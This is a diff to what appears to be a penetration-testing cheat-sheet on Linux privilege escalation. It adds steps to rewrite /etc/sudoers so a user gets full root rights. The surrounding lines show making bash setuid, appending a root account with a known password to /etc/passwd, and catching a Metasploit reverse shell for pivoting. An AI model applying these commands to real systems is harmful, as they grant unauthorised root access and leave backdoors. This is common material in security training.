@@ -85,6 +85,12 @@ chmod +s /bin/bash
 > 1. openssl for generating password hashes command -> openssl passwd -1
 > 1. username:password === skinny1:123 ```echo 'skinny1:$1$UcH1bqbq$q2aTjHzGSqyXJxsE92LRw1:0:0:root:/root:/bin/bash' >> /etc/passwd```
 
+#### PrivESC Methodology for Linux - /etc/sudoers
+> 1. john ALL=(root) /usr/bin/python3 /home/john/file.py #Orignal Command
+> 1. john ALL=(ALL:ALL) ALL #Modified for PrivESC
+> 1. make sure /etc/sudoers is not world writeable by running ```sudo chmod 0555 /etc/sudoers```
+
+
 #### Pivoting crap - MSF, socks4a and proxychains
 > 1. ``` use msf exploit/multi/handler ```
 > 1. get session as reverse shell
